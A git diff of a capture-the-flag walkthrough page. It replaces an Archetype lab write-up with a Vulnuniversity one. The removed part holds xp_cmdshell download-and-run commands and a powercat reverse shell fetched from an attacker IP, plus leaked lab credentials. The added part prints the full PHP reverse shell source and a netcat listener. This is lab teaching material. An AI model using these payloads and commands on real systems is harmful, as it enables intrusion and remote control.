@@ -4,570 +4,259 @@ description: Walk through of the vulnuniversity room
 
 # Vulnuniversity
 
-## Target Details
-
-IP address: 10.129.95.187
-
 ## Full Walk through
 
-### Port scan
-
-We use `naabu` with `nmap-cli` to speed up the usual port scan.
+### Port scanning
 
 ```bash
-naabu -host 10.129.95.187 -p - -nmap-cli 'nmap -sV -sC nmap-output'
+nmap -sC -sV 10.10.110.48 -p-
 ```
 
-Port scan results:
+#### Results:
 
-{% code fullWidth="false" %}
-```awk
-[INF] Current naabu version 2.1.6 (latest)
-[INF] Running CONNECT scan with non root privileges
-[INF] Found 12 ports on host 10.129.95.187 (10.129.95.187)
-10.129.95.187:445
-10.129.95.187:49664
-10.129.95.187:139
-10.129.95.187:47001
-10.129.95.187:49668
-10.129.95.187:49665
-10.129.95.187:49666
-10.129.95.187:49667
-10.129.95.187:1433
-10.129.95.187:49669
-10.129.95.187:5985
-10.129.95.187:135
-[INF] Running nmap command: nmap -sV -sC nmap-output -p 445,139,49665,49666,1433,49669,5985,49667,49664,47001,49668,135 10.129.95.187
-Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 16:24 IST
-Verbosity Increased to 1.
-Verbosity Increased to 2.
-Service scan Timing: About 58.33% done; ETC: 16:25 (0:00:43 remaining)
-Completed Service scan at 16:25, 59.63s elapsed (12 services on 1 host)
-NSE: Script scanning 10.129.95.187.
-NSE: Starting runlevel 1 (of 3) scan.
-Initiating NSE at 16:25
-Completed NSE at 16:25, 17.10s elapsed
-NSE: Starting runlevel 2 (of 3) scan.
-Initiating NSE at 16:25
-Completed NSE at 16:25, 3.99s elapsed
-NSE: Starting runlevel 3 (of 3) scan.
-Initiating NSE at 16:25
-Completed NSE at 16:25, 0.00s elapsed
-Nmap scan report for 10.129.95.187
-Host is up (0.37s latency).
-Scanned at 2023-05-17 16:24:15 IST for 82s
+<figure><img src="../.gitbook/assets/portscan_vuluni.png" alt=""><figcaption><p>Service Enumeration Scan</p></figcaption></figure>
 
-PORT      STATE SERVICE      VERSION
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
-1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
-| ms-sql-info: 
-|   10.129.95.187:1433: 
-|     Version: 
-|       name: Microsoft SQL Server 2017 RTM
-|       number: 14.00.1000.00
-|       Product: Microsoft SQL Server 2017
-|       Service pack level: RTM
-|       Post-SP patches applied: false
-|_    TCP port: 1433
-|_ssl-date: 2023-05-17T05:25:55+00:00; -5h29m42s from scanner time.
-| ms-sql-ntlm-info: 
-|   10.129.95.187:1433: 
-|     Target_Name: ARCHETYPE
-|     NetBIOS_Domain_Name: ARCHETYPE
-|     NetBIOS_Computer_Name: ARCHETYPE
-|     DNS_Domain_Name: Archetype
-|     DNS_Computer_Name: Archetype
-|_    Product_Version: 10.0.17763
-| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
-| Issuer: commonName=SSL_Self_Signed_Fallback
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2023-05-17T05:18:40
-| Not valid after:  2053-05-17T05:18:40
-| MD5:   24ffbff89c78dbb723fe8280eb488645
-| SHA-1: 946929bce2803adf2c0ba4fed1c47f546f1ca95b
-| -----BEGIN CERTIFICATE-----
-| MIIDADCCAeigAwIBAgIQFkVxaO4nCKFNYZUoqFp1uDANBgkqhkiG9w0BAQsFADA7
-| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
-| bABsAGIAYQBjAGswIBcNMjMwNTE3MDUxODQwWhgPMjA1MzA1MTcwNTE4NDBaMDsx
-| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
-| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALYsm+PL
-| ppJGGDP+4yVoQl4D+QmxXK9oHS+VNaSinXnxggasmA74dViF280EepEHHaRkEv3m
-| DvBYLGSqILjMmgWx+XVwsYTJaCapFzxx+78UUtrCpm+x1BquGy2x0sGWB265hSl+
-| 63iBevho3VjftLDqd+WgRxAMJuvVuH9J0eGBNZXBNU2prStpz+586e6l7A2J9Ku4
-| FpLEaOVEWpk6/DHVLfNwsfntVThgOcKTGVvaPJxsGkVXQqMWL8L1/JMyK7luVgHe
-| /e2NkAg3HlTVQ9ifSBFB4HT/QJYDhesq91GsBWtli361uHMG3LMAoGiPjNg1qZPu
-| gi7wpu2fkY0X0QkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAXLCA9eJ1o0uUcvR7
-| t0Xp31KFzVitgN7QW4nHbOBYTbJIQlv9/JjplGvHYJzNWy3lLFcEEoJs0WVHwRyE
-| LJoaVhPkQIPCzfhppAN8BhKjrTbzauWjV8WV6R+Nky7cEKCxI7Fa4hUxrCaBXYbW
-| 1o3PrYd3OZo4bLelLMz+nWIKzSdUlwj3stw0bkvzxbZRsFy3PTzxBtqdtt6ajQIF
-| 0ZdM86mMWD9CFf60FUdPsO1kCoPvTOuhOuCeh7JyXAtp20nrmpNAVIqIPid0FYDm
-| jT70T3rU5aAmiubsC+y9EV3SKToB6vGdSb0kgrqrJK9V+EJW9R0mL13fXPHh20KR
-| 7UUrmw==
-|_-----END CERTIFICATE-----
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49664/tcp open  msrpc        Microsoft Windows RPC
-49665/tcp open  msrpc        Microsoft Windows RPC
-49666/tcp open  msrpc        Microsoft Windows RPC
-49667/tcp open  msrpc        Microsoft Windows RPC
-49668/tcp open  msrpc        Microsoft Windows RPC
-49669/tcp open  msrpc        Microsoft Windows RPC
-Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+#### Services Found:
 
-Host script results:
-|_clock-skew: mean: -4h05m41s, deviation: 3h07m52s, median: -5h29m42s
-| smb-os-discovery: 
-|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
-|   Computer name: Archetype
-|   NetBIOS computer name: ARCHETYPE\x00
-|   Workgroup: WORKGROUP\x00
-|_  System time: 2023-05-16T22:25:39-07:00
-| p2p-conficker: 
-|   Checking for Conficker.C or higher...
-|   Check 1 (port 56233/tcp): CLEAN (Couldn't connect)
-|   Check 2 (port 30913/tcp): CLEAN (Couldn't connect)
-|   Check 3 (port 11076/udp): CLEAN (Failed to receive data)
-|   Check 4 (port 4389/udp): CLEAN (Timeout)
-|_  0/4 checks are positive: Host is CLEAN or ports are blocked
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-time: 
-|   date: 2023-05-17T05:25:35
-|_  start_date: N/A
-| smb2-security-mode: 
-|   311: 
-|_    Message signing enabled but not required
+* Port 3333: Apache HTTP server (2.4.8)
+* Port 3128: Squid proxy server 3.5.12
+* Port 22: OpenSSH 7.2p2
+* Port 21: vsftpd (FTP server)
+* Port 139, 445: SMB over NetBIOS
 
-NSE: Script Post-scanning.
-NSE: Starting runlevel 1 (of 3) scan.
-Initiating NSE at 16:25
-Completed NSE at 16:25, 0.00s elapsed
-NSE: Starting runlevel 2 (of 3) scan.
-Initiating NSE at 16:25
-Completed NSE at 16:25, 0.00s elapsed
-NSE: Starting runlevel 3 (of 3) scan.
-Initiating NSE at 16:25
-Completed NSE at 16:25, 0.00s elapsed
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 82.41 seconds
-```
-{% endcode %}
-
-### List available SMB shares
-
-We have SMB running so let's try and connect with the SMB server and list available shares.
-
-```awk
-smbclient -N -L \\\\10.129.95.187\\
-```
-
-We use the `-N` flag as it supresses the default password prompt from smbclient - useful for situations where we do not need a password to access a share. We use the `-L` flag as it lists all available shares.
-
-We get the follwing shares available:
-
-```awk
-        Sharename       Type      Comment
-        ---------       ----      -------
-        ADMIN$          Disk      Remote Admin
-        backups         Disk      
-        C$              Disk      Default share
-        IPC$            IPC       Remote IPC
-Reconnecting with SMB1 for workgroup listing.
-do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
-Unable to connect with SMB1 -- no workgroup available
-
-```
-
-We find that the backups share is publicly available and it's not an administrative share.&#x20;
-
-### Enumerate and dump contents from backups share
-
-```awk
-smbclient -N  \\\\10.129.95.187\\backups
-```
-
-We find a file named `prod.dtsConfig`.&#x20;
-
-```
-smb: \> dir
-  .                                   D        0  Mon Jan 20 17:50:57 2020
-  ..                                  D        0  Mon Jan 20 17:50:57 2020
-  prod.dtsConfig                     AR      609  Mon Jan 20 17:53:02 2020
-
-                5056511 blocks of size 4096. 2616175 blocks available
-smb: \> get prod.dtsConfig 
-getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
-```
-
-A DTSCONFIG file (or a `.dtsConfig` file )is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of [metadata](https://techterms.com/definition/metadata) such as the server name, database names, and other connection properties to configure SSIS packages.
-
-**DTSCONFIG files often contain sensitive information, therefore, access to the location of the files should be restricted.**
-
-The contents of the file reveals a username and password for the MS-SQL database which we found in the port scan results.
-
-{% code overflow="wrap" %}
-```xml
-<DTSConfiguration>
-    <DTSConfigurationHeading>
-        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
-    </DTSConfigurationHeading>
-    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
-        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
-    </Configuration>
-</DTSConfiguration>
-```
-{% endcode %}
-
-From this we get the USER ID as `ARCHETYPE\sql_svc` and the password as `M3g4c0rp123`.
-
-### Gain access to MS-SQL service using the credential from production data service configuration file.
-
-#### Using impacket-mssqlclient&#x20;
-
-```awk
-impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
-```
-
-This helps us to connect to the database after providing the password at the password prompt.
-
-### Command injection via xp\_cmdshell
-
-Using the given options from mssqlclient:
-
-```
-SQL> help
-
-     lcd {path}                 - changes the current local directory to {path}
-     exit                       - terminates the server process (and this session)
-     enable_xp_cmdshell         - you know what it means
-     disable_xp_cmdshell        - you know what it means
-     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
-     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
-     ! {cmd}                    - executes a local shell cmd
-```
-
-We can enable xp\_cmdshell using `enable_xp_cmdshell`, even though it is disabled by default.
-
-After enabling it we can find the username that has access to the service:
+### Vulnerability scan
 
 ```bash
-SQL> xp_cmdshell "powershell -c whoami"
-output                                                                             
-
---------------------------------------------------------------------------------   
-
-archetype\sql_svc                                                                  
-
-NULL
+nmap --script vuln 10.10.110.48 -p 3333,3128,22,21,139,445
 ```
 
-Since we are in the `C:\Windows\system32` directory, we cannot make changes here as the Administrator can only make changes in this directory.
+<figure><img src="../.gitbook/assets/smb_dos_vuln.png" alt=""><figcaption><p>Vulnerability scan results</p></figcaption></figure>
 
-We can change to `C:\Users\Public` directory for downloading shells and privilege escalation executable.  Since there is no persistence we will have to use the `cd` command chained with other commands.
-
-### Foot holding
-
-Now that we can execute any arbitrary commands on the victim machine, we can get a firmer foothold on the victim server, aka, a reverse shell access. We can do this in two ways:
-
-### Using metasploit and python HTTP server
-
-Spin up an `msfvenom` payload using:
-
-```awk
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f exe -o payload.exe
-```
-
-Start python HTTP server using:
-
-```
-python3 -m http.server 8000
-```
-
-Fetch and execute the payload using:&#x20;
+### Directory discovery
 
 ```bash
-xp_cmdshell "powershell -c cd C:\Users\Public; wget http://10.10.14.29:8000/payload.exe -o payload.exe; .\payload.exe"
+gobuster dir --url http://10.10.110.48:3333/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-1.0.txt
 ```
 
-This would freeze the mssqlclient, but we will get shell access on the msfconsole.
+<figure><img src="../.gitbook/assets/gobuster_internal_dir.png" alt=""><figcaption><p>Gobuster directory brute force</p></figcaption></figure>
 
-Start a new `msfconsole`:
+We find the `/internal` directory, where we can upload files via the internal upload portal:
 
+<figure><img src="../.gitbook/assets/internal_upload_portal.png" alt=""><figcaption><p>Upload portal</p></figcaption></figure>
+
+### Arbitrary file upload
+
+The internal upload portal, has no authentication and supports arbitrary file upload of `.phtml` files.&#x20;
+
+<figure><img src="../.gitbook/assets/php-rev-shell.png" alt=""><figcaption><p>php reverse shell file </p></figcaption></figure>
+
+### Remote Code Execution
+
+To get a shell access we create the following php-reverse-shell.phtml file to exploit the file upload vulnerability:
+
+```php
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.17.30.161';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+        // Fork and have the parent process exit
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1);
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+
+        // Make the current process a session leader
+        // Will only succeed if we forked
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+
+        $daemon = 1;
+} else {
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit("$errstr ($errno)");
+        exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+        // Check for end of TCP connection
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+
+        // Check for end of STDOUT
+        if (feof($pipes[1])) {
+                printit("ERROR: Shell process terminated");
+                break;
+        }
+
+        // Wait until a command is end down $sock, or some
+        // command output is available on STDOUT or STDERR
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        // If we can read from the TCP socket, send
+        // data to process's STDIN
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit("SOCK: $input");
+                fwrite($pipes[0], $input);
+        }
+
+        // If we can read from the process's STDOUT
+        // send data down tcp connection
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit("STDOUT READ");
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input);
+        }
+
+        // If we can read from the process's STDERR
+        // send data down tcp connection
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+
+?>
 ```
-msfconsole
-```
 
-We need a multi/handler exploit to catch our payload's connection request:
+We can easily execute our `php-reverse-shell.phtml` file by visiting the link `http://10.10.110.48:3333/internal/uploads/php-reverse-shell.phtml`&#x20;
+
+<figure><img src="../.gitbook/assets/execution_rev_shell.png" alt=""><figcaption><p>Execution of uploaded exploit</p></figcaption></figure>
+
+To connect to the reverse shell we create a simple netcat listener using:
 
 ```bash
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 10.10.14.29
-msf6 exploit(multi/handler) > exploit
-```
-
-Wait for sometime until the shell pops up:
-
-```bash
-msf6 exploit(multi/handler) > run
-
-[*] Started reverse TCP handler on 10.10.14.29:4444 
-[*] Sending stage (200774 bytes) to 10.129.95.187
-[*] Meterpreter session 29 opened (10.10.14.29:4444 -> 10.129.95.187:49709) at 2023-05-19 22:48:36 +0530
-
-meterpreter > ls
-Listing: C:\Users\Public
-========================
-
-Mode              Size  Type  Last modified              Name
-----              ----  ----  -------------              ----
-040555/r-xr-xr-x  0     dir   2021-07-27 15:00:54 +0530  AccountPictures
-040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Desktop
-040555/r-xr-xr-x  0     dir   2020-01-20 12:09:33 +0530  Documents
-040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Downloads
-040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Libraries
-040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Music
-040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Pictures
-040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Videos
-100666/rw-rw-rw-  174   fil   2018-09-15 12:41:27 +0530  desktop.ini
-100777/rwxrwxrwx  7168  fil   2023-05-19 17:14:51 +0530  payload.exe
-```
-
-### Using net/powercat reverse shell and python HTTP server
-
-We can download [`powercat.ps1`](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) file on the victim machine by hosting it in a python HTTP server.
-
-Start python HTTP server using:
-
-```
-python3 -m http.server 8000
-```
-
-Now setup a netcat listener
-
-```awk
 nc -vnlp 4444
 ```
 
-Now on our mssqlclient we use:
-
-```sql
-xp_cmdshell "powershell -c cd C:\Users\Public; IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.28:8000/powercat.ps1\"); powercat -c 10.10.14.28 -p 4444 -e cmd;"
-```
-
-The client freezes but we get a shell on our netcat listener terminal:
-
-```
-listening on [any] 4444 ...
-connect to [10.10.14.28] from (UNKNOWN) [10.129.228.29] 49680
-Microsoft Windows [Version 10.0.17763.2061]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>
-```
-
-If we try to enter the Administrator user's directory we can't from here:
-
-```
-C:\Users>cd Administrator
-cd Administrator
-Access is denied.
-```
-
-So we need to perform privilege escalation.&#x20;
-
-### Vulnerability and CVE scanning with winpeas
-
-We can use `winpeas` to find vulnerabilities or leaked credentials that can help us in privilege escalation.&#x20;
-
-#### Using meterpreter reverse shell
-
-Upload the `winPEASx64.exe` using upload options in the meterpreter:
-
-```bash
-meterpreter > upload winPEASx64.exe
-```
-
-```awk
-[*] Uploading  : /home/fvalkyrie/winPEASx64.exe -> winPEASx64.exe
-[*] Uploaded 1.93 MiB of 1.93 MiB (100.0%): /home/fvalkyrie/winPEASx64.exe -> winPEASx64.exe
-[*] Completed  : /home/fvalkyrie/winPEASx64.exe -> winPEASx64.exe
-```
-
-Execute winpeas after shell-ing into the meterpreter session:
-
-```
-meterpreter > shell
-Process 604 created.
-Channel 5 created.
-Microsoft Windows [Version 10.0.17763.2061]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Users\sql_svc\Desktop>.\winPEASx64.exe
-```
-
-#### Using powercat reverse shell
-
-After changing to `powershell`, we can use the following command to get `winPEASx64.exe` from the attacker machine onto the victim machine. :
-
-```powershell
-wget http://10.10.14.28:8000/winPEASx64.exe -o winPEASx64.exe; .\winPEASx64.exe
-```
-
-WinPEAS gives us some critical vulnerabilities:
-
-```
-[!] CVE-2019-0836 : VULNERABLE
-  [>] https://exploit-db.com/exploits/46718
-  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/
-
- [!] CVE-2019-0841 : VULNERABLE
-  [>] https://github.com/rogue-kdc/CVE-2019-0841
-  [>] https://rastamouse.me/tags/cve-2019-0841/
-
- [!] CVE-2019-1064 : VULNERABLE
-  [>] https://www.rythmstick.net/posts/cve-2019-1064/
-
- [!] CVE-2019-1130 : VULNERABLE
-  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear
-
- [!] CVE-2019-1253 : VULNERABLE
-  [>] https://github.com/padovah4ck/CVE-2019-1253
-  [>] https://github.com/sgabe/CVE-2019-1253
-
- [!] CVE-2019-1315 : VULNERABLE
-  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
-
- [!] CVE-2019-1385 : VULNERABLE
-  [>] https://www.youtube.com/watch?v=K6gHnr-VkAg
-
- [!] CVE-2019-1388 : VULNERABLE
-  [>] https://github.com/jas502n/CVE-2019-1388
-
- [!] CVE-2019-1405 : VULNERABLE
-  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                                                                                                                                            
-  [>] https://github.com/apt69/COMahawk
-
- [!] CVE-2020-0668 : VULNERABLE
-  [>] https://github.com/itm4n/SysTracingPoc
-
- [!] CVE-2020-0683 : VULNERABLE
-  [>] https://github.com/padovah4ck/CVE-2020-0683
-  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1
-
- [!] CVE-2020-1013 : VULNERABLE
-  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/
-
- [*] Finished. Found 12 potential vulnerabilities.
-```
-
-And the powershell console history.
-
-```
- PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
- PS history size: 79
-```
-
-Which gives us the Administrator password:
-
-```
-cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
-exit
-```
-
-### Gain administrator access
-
-We know the administrator username is `administrator` and password is `MEGACORP_4dm1n!!`. Now, we can follow either of the two methods to login as the administrator.&#x20;
-
-### Using impacket-psexec
-
-```awk
-impacket-psexec ARCHETYPE/administrator@10.129.95.187 
-```
-
-After providing the password at the prompt we get the shell access:
-
-```
-Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
-
-Password:
-[*] Requesting shares on 10.129.95.187.....
-[*] Found writable share ADMIN$
-[*] Uploading file VuaxbZOR.exe
-[*] Opening SVCManager on 10.129.95.187.....
-[*] Creating service lSNA on 10.129.95.187.....
-[*] Starting service lSNA.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.17763.2061]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32> 
-```
-
-### Using evil-winrm
-
-```awk
-evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!'
-```
-
-```
-*Evil-WinRM* PS C:\Users\Administrator> dir
-
-
-    Directory: C:\Users\Administrator
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-r---        7/27/2021   2:30 AM                3D Objects
-d-r---        7/27/2021   2:30 AM                Contacts
-d-r---        7/27/2021   2:30 AM                Desktop
-d-r---        7/27/2021   2:30 AM                Documents
-d-r---        7/27/2021   2:30 AM                Downloads
-d-r---        7/27/2021   2:30 AM                Favorites
-d-r---        7/27/2021   2:30 AM                Links
-d-r---        7/27/2021   2:30 AM                Music
-d-r---        7/27/2021   2:30 AM                Pictures
-d-r---        7/27/2021   2:30 AM                Saved Games
-d-r---        7/27/2021   2:30 AM                Searches
-d-r---        7/27/2021   2:30 AM                Videos
-
-
-*Evil-WinRM* PS C:\Users\Administrator>
-```
-
-## FLAGS
-
-### Root Flag
-
-```
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-b91ccec3305e98240082d4474b848528
-*Evil-WinRM* PS C:\Users\Administrator\Desktop>
-```
-
-### User Flag
-
-```
-*Evil-WinRM* PS C:\Users\sql_svc\Desktop> cat user.txt
-3e7b102e78218e935bf3f4951fec21a3
-*Evil-WinRM* PS C:\Users\sql_svc\Desktop> 
-```
-
-
+<figure><img src="../.gitbook/assets/netcat_shell.png" alt=""><figcaption><p>revesre shell in action</p></figcaption></figure>
 
 
 
